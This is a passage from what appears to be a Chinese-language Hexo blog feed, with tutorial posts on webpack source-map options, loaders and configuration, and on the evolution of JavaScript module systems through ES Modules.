class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  devtool: <span class="string">'source-map'</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时在代码中写一个错误，就可以在控制台看到源文件的错误</span></span><br></pre></td></tr></table></figure><p>该配置可选且具有多个配置项 ，具体包含以下：</p><table><thead><tr><th>devtool</th><th>构建速度</th><th>重新构建速度</th><th>生产环境</th><th>品质(quality)</th></tr></thead><tbody><tr><td>(none)</td><td>+++</td><td>+++</td><td>yes</td><td>打包后的代码</td></tr><tr><td>eval</td><td>+++</td><td>+++</td><td>no</td><td>生成后的代码</td></tr><tr><td>cheap-eval-source-map</td><td>+</td><td>++</td><td>no</td><td>转换过的代码（仅限行）</td></tr><tr><td>cheap-module-eval-source-map</td><td>o</td><td>++</td><td>no</td><td>原始源代码（仅限行）</td></tr><tr><td>eval-source-map</td><td>–</td><td>+</td><td>no</td><td>原始源代码</td></tr><tr><td>cheap-source-map</td><td>+</td><td>o</td><td>yes</td><td>转换过的代码（仅限行）</td></tr><tr><td>cheap-module-source-map</td><td>o</td><td>-</td><td>yes</td><td>原始源代码（仅限行）</td></tr><tr><td>inline-cheap-source-map</td><td>+</td><td>o</td><td>no</td><td>转换过的代码（仅限行）</td></tr><tr><td>inline-cheap-module-source-map</td><td>o</td><td>-</td><td>no</td><td>原始源代码（仅限行）</td></tr><tr><td>source-map</td><td>–</td><td>–</td><td>yes</td><td>原始源代码</td></tr><tr><td>inline-source-map</td><td>–</td><td>–</td><td>no</td><td>原始源代码</td></tr><tr><td>hidden-source-map</td><td>–</td><td>–</td><td>yes</td><td>原始源代码</td></tr><tr><td>nosources-source-map</td><td>–</td><td>–</td><td>yes</td><td>无源代码内容</td></tr></tbody></table><blockquote><p><em>+++ 非常快速, ++ 快速, + 比较快, o 中等, - 比较慢, – 慢</em></p></blockquote><ul><li>eval：是否使用 eval 执行模块代码，通过 SourceURL 标注文件路径，并没有生成 SourceMap</li><li>cheap：Source map是否包含行信息</li><li>module：是否能够得到 Loader 处理之前的源代码</li><li>inline：使用 dataURL 把 SourceMap 嵌入 （不常用）</li><li>hidden：控制台看不到SourceMap</li><li>nosources：看不见源代码，生产环境保护源代码</li></ul><hr><ul><li>eval-source-map：相比 eval 生成了 SourceMap</li><li>cheap-eval-source-map：简单版的eval-source-map，只有行没有列</li><li>cheap-module-eval-source-map：没有经过 loader 加工，真正的源代码（vue中常用）</li></ul><hr><p>开发模式：cheap-eval-source-map</p><p>生产模式：none</p>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（一）</title>
      <link href="2020/09/06/%E6%95%B4%E7%90%86-webPack%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/09/06/%E6%95%B4%E7%90%86-webPack%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>webpack初体验</li><li>如何打包css和图片</li><li>常用加载器分类</li><li>如何处理ES6语法</li><li>模块加载方式</li><li>自己创建一个loader</li></ul><a id="more"></a> <h2 id="webpack初体验"><a href="#webpack初体验" class="headerlink" title="webpack初体验"></a>webpack初体验</h2><blockquote><p> webpack是一种前端资源构建工具，一个静态模块打包器（module bundler）。在webpack看来，前端的所有资源文件（js/json/css/img/less…）都会作为模块处理。它将根据模块的依赖关系进行静态分析，打包生成对应的静态资源（bundle）</p></blockquote><p>安装：<code>cnpm install -D webpack webpack-cli</code>，举例：比如此时有如下的目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|--src</span><br><span class="line">    --heading.js  // 遵循ES Modules</span><br><span class="line">    --index.js</span><br><span class="line">|--index.html</span><br><span class="line">|--package.json</span><br></pre></td></tr></table></figure><p>其中<code>index.js</code>模块中引入了<code>heading.js</code>模块导出的方法，而<code>index.html</code>中又引入了<code>index.js</code>，默认入口为<code>src/index.js</code></p><blockquote><p>html文件中原本的引入</p><p>script type=”module” src=”src/index.js”</p></blockquote><p>运行<code>webpack</code>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|--dist</span><br><span class="line">    --main.js // 打包后的js文件</span><br><span class="line">|--src</span><br><span class="line">    --heading.js</span><br><span class="line">    --index.js</span><br><span class="line">|--index.html</span><br><span class="line">|--package.json</span><br></pre></td></tr></table></figure><blockquote><p>html文件中，打包之后的引入</p><p>script src=”dist/main.js”</p></blockquote><h3 id="如何添加配置入口文件"><a href="#如何添加配置入口文件" class="headerlink" title="如何添加配置入口文件"></a>如何添加配置入口文件</h3><p>新建<code>webpack.config.js</code>文件，使用<code>common.js</code>规范</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// mode这个属性有三种取值，分别是 production、development 和 none。</span></span><br><span class="line">  <span class="comment">// 1. 生产模式下，Webpack 会自动优化打包结果；</span></span><br><span class="line">  <span class="comment">// 2. 开发模式下，Webpack 会自动优化打包速度，添加一些调试过程中的辅助；</span></span><br><span class="line">  <span class="comment">// 3. None 模式下，Webpack 就是运行最原始的打包，不做任何额外处理；</span></span><br><span class="line">  mode: <span class="string">'development'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>, <span class="comment">// 入口</span></span><br><span class="line">  output: &#123; </span><br><span class="line">    filename: <span class="string">'bundle.js'</span>, </span><br><span class="line">    path: path.join(__dirname, <span class="string">'output'</span>) <span class="comment">//必须是绝对路径，__dirname为当前文件夹路径,加上output，最终输出到output中</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何打包css文件"><a href="#如何打包css文件" class="headerlink" title="如何打包css文件"></a>如何打包css文件</h2><p>因为webpack默认打包js文件，所以我们需要额外的loader来处理，<code>cnpm install -D style-loader css-loader</code></p><ul><li>css-loader：处理css文件，将其打包至js文件中</li><li>style-loader：用于展示打包后的css文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在webpack.config.js中新增</span></span><br><span class="line"> <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.css$/</span>, <span class="comment">// 遇到css文件时</span></span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>, <span class="comment">// 采用如下loader，从后向前调用</span></span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 然后比如在main.js中通过import的方式引入main.css文件</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./main.css'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时运行webpack就会打包css文件</span></span><br></pre></td></tr></table></figure><h3 id="如何打包图片"><a href="#如何打包图片" class="headerlink" title="如何打包图片"></a>如何打包图片</h3><p><code>cnpm install -D file-loader url-loader</code>，首先在<code>main.js</code>使用import的方式中导入<code>./icon.png</code></p><ul><li>超出10KB的文件单独提取存放在dist中</li><li>小于10KB的文件转换为 Data URLs 嵌入代码中（base64编码）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">|--dist</span><br><span class="line">    --bundle.js </span><br><span class="line">    --aaa0e...png // 打包后的图片</span><br><span class="line">|--src</span><br><span class="line">    --heading.js</span><br><span class="line">    --main.js</span><br><span class="line">    --main.css</span><br><span class="line">    --icon.png</span><br><span class="line">|--index.html</span><br><span class="line">|--package.json</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>),</span><br><span class="line">    publicPath: <span class="string">'dist/'</span>                 <span class="comment">// 因为index.html在根目录，所以图片也从根目录加载，不会显示，要加上dist</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.css$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.png$/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">'url-loader'</span>, <span class="comment">// 大于10KB的还会使用file-loader</span></span><br><span class="line">          options: &#123;</span><br><span class="line">            limit: <span class="number">10</span> * <span class="number">1024</span> <span class="comment">// 10 KB</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常用加载器分类"><a href="#常用加载器分类" class="headerlink" title="常用加载器分类"></a>常用加载器分类</h2><ul><li>编译转换类：比如css-loader将css编译并嵌入在bundle.js</li><li>文件操作类：比如file-loader</li><li>代码检查类：比如eslint-loader</li></ul><h2 id="如何处理ES6语法"><a href="#如何处理ES6语法" class="headerlink" title="如何处理ES6语法"></a>如何处理ES6语法</h2><p>虽然webpack支持import和export模块化，但并不支持ES6语法</p><p><code>cnpm install -D babel-loader @babel/core @babel/preset-env</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// rules新增</span><br><span class="line">&#123;</span><br><span class="line">        test: /.js$/,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: 'babel-loader',</span><br><span class="line">          options: &#123;</span><br><span class="line">            presets: ['@babel/preset-env']</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="模块加载方式"><a href="#模块加载方式" class="headerlink" title="模块加载方式"></a>模块加载方式</h2><ul><li>遵循 ES Modules 标准的 import 声明（非特殊情况只用这一种）</li><li>遵循 CommonJS 标准的 require函数</li><li>遵循 AMD 标准的 define 函数和 require 函数</li><li><ul><li>样式代码中的@import指令和url函数</li><li>HTML 代码中图片标签的 src 属性，a标签的href属性（需要配置）</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// html中的a标签的href属性需要配置</span></span><br><span class="line"> &#123;</span><br><span class="line">        test: <span class="regexp">/.html$/</span>,</span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">'html-loader'</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            attrs: [<span class="string">'img:src'</span>, <span class="string">'a:href'</span>]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="自己创建一个loader"><a href="#自己创建一个loader" class="headerlink" title="自己创建一个loader"></a>自己创建一个loader</h2><p>根目录下新建一个<code>markdown-loader.js</code>作为处理<code>md</code>文件的<code>loader</code>，然后在<code>webpack.config.js</code>中配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>),</span><br><span class="line">    publicPath: <span class="string">'dist/'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.md$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'html-loader'</span>,</span><br><span class="line">          <span class="string">'./markdown-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// markdown-loader.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> marked = <span class="built_in">require</span>(<span class="string">'marked'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">source</span> =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">const</span> html = marked(source)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回 html 字符串交给下一个 loader 处理</span></span><br><span class="line">  <span class="keyword">return</span> html</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// loader管道示意</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Source =&gt; md-loader =&gt; loader2 =&gt; loader3 =&gt; Result （js文件）</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模块化</title>
      <link href="2020/09/05/%E6%95%B4%E7%90%86-%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
      <url>2020/09/05/%E6%95%B4%E7%90%86-%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<ul><li>模块化的演变过程</li><li>ES Modules</li><li>Polyfill</li><li>ES Module与CommonJS交互</li></ul><a id="more"></a> <h2 id="模块化的演变过程"><a href="#模块化的演变过程" class="headerlink" title="模块化的演变过程"></a>模块化的演变过程</h2><ol><li>基于文件的划分模块的方式</li></ol><blockquote><p>所有模块都直接在全局工作，没有私有空间，所有成员都可以在模块外部被访问或者修改，</p><p>而且模块一段多了过后，容易产生命名冲突，</p><p>另外无法管理模块与模块之间的依赖关系</p></blockquote><ol start="2"><li>命名空间方式</li></ol><blockquote><p>具体做法就是在第一阶段的基础上，通过将每个模块「包裹」为一个全局对象的形式实现，</p><p>有点类似于为模块内的成员添加了「命名空间」的感觉。</p><p>通过「命名空间」减小了命名冲突的可能，</p><p>但是同样没有私有空间，所有模块成员也可以在模块外部被访问或者修改，</p><p>而且也无法管理模块之间的依赖关系。</p></blockquote><ol start="3"><li>IIFE：立即执行函数，实现了私有成员</li></ol><blockquote><p>具体做法就是将每个模块成员都放在一个函数提供的私有作用域中，</p><p>对于需要暴露给外部的成员，通过挂在到全局对象上的方式实现</p><p>有了私有成员的概念，私有成员只能在模块成员内通过闭包的形式访问。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module a 相关状态数据和功能函数，IIFE</span></span><br><span class="line"></span><br><span class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">'module-a'</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">method1</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(name + <span class="string">'#method1'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">method2</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(name + <span class="string">'#method2'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.moduleA = &#123;</span><br><span class="line">    method1: method1,</span><br><span class="line">    method2: method2</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><ol start="4"><li>CommonJS规范（node环境）</li></ol><ul><li>一个文件就是一个模块</li><li>每个模块都有单独的作用域</li><li>通过<code>module.exports</code>导出成员</li><li>通过require函数载入模块</li></ul><blockquote><p>浏览器端不能使用，因为CommonJS是以同步模式加载模块，每一次页面加载都会有大量模块请求</p></blockquote><ol start="5"><li>AMD：Asynchronous Module Definition （异步模块定义）</li></ol><blockquote><p>同时期推出了require.js，实现了AMD规范</p><p>目前绝大数第三方库都支持AMD规范</p><p>但是AMD使用起来比较复杂，模块JS文件请求频繁</p></blockquote><ol start="6"><li>Sea.js + CMD ：Common Module Definition </li></ol><blockquote><p>类似于CommonJS的语法</p></blockquote><h2 id="ES-Modules"><a href="#ES-Modules" class="headerlink" title="ES Modules"></a>ES Modules</h2><ul><li>CommonJS in Node.js（目前Node8以上也支持ES Modules）</li><li>ES Modules in Browsers（ES6）</li></ul><h3 id="ES-Modules-基本特性"><a href="#ES-Modules-基本特性" class="headerlink" title="ES Modules 基本特性"></a>ES Modules 基本特性</h3><ul><li>自动采用严格模式，忽略 ‘use strict’</li><li>每个 ES Module 都是运行在单独的私有作用域中</li><li>ESM 是通过 CORS 的方式请求外部 JS 模块的</li><li>ESM 的 script 标签会延迟执行脚本</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通过给 script 添加 type = module 的属性，就可以以 ES Module 的标准执行其中的 JS 代码了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="string">'this is es module'</span>)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 1. ESM 自动采用严格模式，忽略 'use strict' --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="keyword">this</span>) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2. 每个 ES Module 都是运行在单独的私有作用域中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> foo = <span class="number">100</span></span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(foo)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(foo)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3. ESM 是通过 CORS 的方式请求外部 JS 模块的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/jquery@3.4.1/dist/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 4. ESM 的 script 标签会延迟执行脚本,此处会先执行p标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">"demo.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>需要显示的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ES-Modules-的导入导出"><a href="#ES-Modules-的导入导出" class="headerlink" title="ES Modules 的导入导出"></a>ES Modules 的导入导出</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> fooName, fooHello, Person &#125; <span class="keyword">from</span> <span class="string">'./module.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> height23 <span class="keyword">from</span> <span class="string">'./module.js'</span> <span class="comment">// 接收default</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(fooName, fooHello, Person)</span><br><span class="line"></span><br><span class="line"><span class="comment">// modeule.js</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'foo module'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> height = <span class="number">180</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; name <span class="keyword">as</span> <span class="keyword">default</span>, hello <span class="keyword">as</span> fooHello, Person &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> height</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.html</span></span><br><span class="line">&lt;script type=<span class="string">"module"</span> src=<span class="string">"app.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="几点注意事项"><a href="#几点注意事项" class="headerlink" title="几点注意事项"></a>几点注意事项</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; name &#125; <span class="keyword">from</span> <span class="string">'./module.js'</span> <span class="comment">// 不能省略.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; lowercase &#125; <span class="keyword">from</span> <span class="string">'./utils/index.js'</span> <span class="comment">// 不能省略index.js，否则找不到</span></span><br><span class="line"><span class="keyword">import</span> &#123; name &#125; <span class="keyword">from</span> <span class="string">'./module.js'</span> <span class="comment">// 不能省略./，否则认为加载第三方模块</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./module.js'</span> <span class="comment">// 加载这个模块但是不提取</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> mod <span class="keyword">from</span> <span class="string">'./module.js'</span> <span class="comment">// 提取所有放入mod对象中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面这两种方式不正确，不能动态条件导入</span></span><br><span class="line"><span class="keyword">var</span> modulePath = <span class="string">'./module.js'</span></span><br><span class="line"><span class="keyword">import</span> &#123; name &#125; <span class="keyword">from</span> modulePath</span><br><span class="line"><span class="built_in">console</span>.log(name)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">   <span class="keyword">import</span> &#123; name &#125; <span class="keyword">from</span> <span class="string">'./module.js'</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 那怎么动态导入呢</span></span><br><span class="line"> <span class="keyword">import</span>(<span class="string">'./module.js'</span>).then(<span class="function"><span class="keyword">function</span> (<span class="params">module</span>) 